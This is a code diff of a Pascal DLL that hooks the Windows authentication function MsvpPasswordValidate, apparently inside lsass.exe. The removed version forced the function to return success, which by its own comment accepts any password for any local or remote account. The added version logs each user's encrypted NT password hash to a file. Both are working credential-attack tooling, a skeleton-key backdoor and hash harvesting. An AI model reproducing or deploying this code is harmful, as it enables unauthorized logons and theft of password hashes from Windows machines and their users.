@@ -3,6 +3,25 @@ library hook;
 
 uses windows,DDetours,sysutils  ;
 
+type _NETLOGON_LOGON_INFO_CLASS =(
+  NetlogonInteractiveInformation = 1,NetlogonNetworkInformation,
+  NetlogonServiceInformation,NetlogonGenericInformation,
+  NetlogonInteractiveTransitiveInformation,NetlogonNetworkTransitiveInformation,
+  NetlogonServiceTransitiveInformation);
+
+
+type tbyte16=array[0..15] of byte;
+
+type _SAMPR_USER_INTERNAL1_INFORMATION =record
+   EncryptedNtOwfPassword:tbyte16;
+   EncryptedLmOwfPassword:tbyte16;
+   NtPasswordPresent:byte;
+   LmPasswordPresent:byte;
+   PasswordExpired:byte;
+   end;
+ SAMPR_USER_INTERNAL1_INFORMATION=_SAMPR_USER_INTERNAL1_INFORMATION;
+ PSAMPR_USER_INTERNAL1_INFORMATION=^SAMPR_USER_INTERNAL1_INFORMATION;
+
 type TMsvpPasswordValidate=function(a:pointer;
      logontype:word;
      b:pointer;
@@ -28,7 +47,8 @@ the reference count of the mapped module will be decremented.
 Therefore, do not pass a handle returned by GetModuleHandle to the FreeLibrary function.
 Doing so can cause a DLL module to be unmapped prematurely.
 }
-procedure logfile(s:string;l:ushort=0);
+
+procedure log(s:string;l:ushort=0);
 var
    	 hFile:HANDLE;
 	 dwWritten:DWORD;
@@ -52,6 +72,34 @@ begin
 	end;
 end;
 
+function ByteToHexaString(hash:array of byte):string;
+var
+  i:word;
+  dummy:string='';
+begin
+//log('**** ByteToHexaString ****');
+//log('sizeof:'+inttostr(sizeof(hash)));
+try
+  for i:=0 to sizeof(hash)-1 do  dummy:=dummy+inttohex(hash[i],2);
+  result:=dummy;
+except
+on e:exception do log('ByteToHexaString:'+e.Message );
+end;
+end;
+
+{
+BOOLEAN
+MsvpPasswordValidate (
+    IN BOOLEAN UasCompatibilityRequired,
+    IN NETLOGON_LOGON_INFO_CLASS LogonLevel,
+    IN PVOID LogonInformation,
+    IN PUSER_INTERNAL1_INFORMATION Passwords,
+    OUT PULONG UserFlags,
+    OUT PUSER_SESSION_KEY UserSessionKey,
+    OUT PLM_SESSION_KEY LmSessionKey
+)
+}
+
 function myMsvpPasswordValidate(a:pointer;
      logontype:word;
      b:pointer;
@@ -66,17 +114,18 @@ s:string;
 match:boolean=false;
 begin
 s:='';
-OutputDebugString('myrtlcomparememory');
-//logfile ('myrtlcomparememory'#13#10);
-logfile ('MsvpPasswordValidate:'+inttostr(logontype)+#13#10);
-//Result := Trampoline(a,logontype,b,c,d,e,f );
-result:=1; //this will validate any password and any account (local & remote)
+OutputDebugString('MsvpPasswordValidate');
+log('****************'+#13#10);
+log('LogonLevel:'+inttostr(logontype)+#13#10);
+log('EncryptedNtOwfPassword:'+ByteToHexaString(PSAMPR_USER_INTERNAL1_INFORMATION(c)^.EncryptedNtOwfPassword)+#13#10) ;
+Result := Trampoline(a,logontype,b,c,d,e,f );
+//result:=1; //this will validate any password and any account (local & remote)
 end;
 
 function attach(param:pointer):dword;
 begin
 OutputDebugString('attach');
-logfile ('attach'#13#10);
+log ('attach'#13#10);
 @Trampoline := InterceptCreate('ntlmshared.dll','MsvpPasswordValidate', @myMsvpPasswordValidate, nil);
 //the below effectively unloads the dll but crashes lsass.exe
 //FreeLibraryAndExitThread(GetModuleHandle('hook.dll'), 0);
@@ -87,12 +136,12 @@ end;
 procedure detach;
 begin
 OutputDebugString('detach');
-logfile ('detach'#13#10);
+log ('detach'#13#10);
   if Assigned(Trampoline) then
     begin
       InterceptRemove(@Trampoline);
       Trampoline := nil;
-      logfile ('trampoline removed'#13#10);
+      log ('trampoline removed'#13#10);
     end;
 end;
 
@@ -143,7 +192,7 @@ end;
 
 begin
 OutputDebugString('BEGIN');
-logfile ('BEGIN'#13#10);
+log ('BEGIN'#13#10);
 {$ifdef fpc}
 Dll_Thread_Attach_Hook := @DLLTHREADATTACH;
 Dll_Thread_Detach_Hook := @DLLTHREADDETACH;
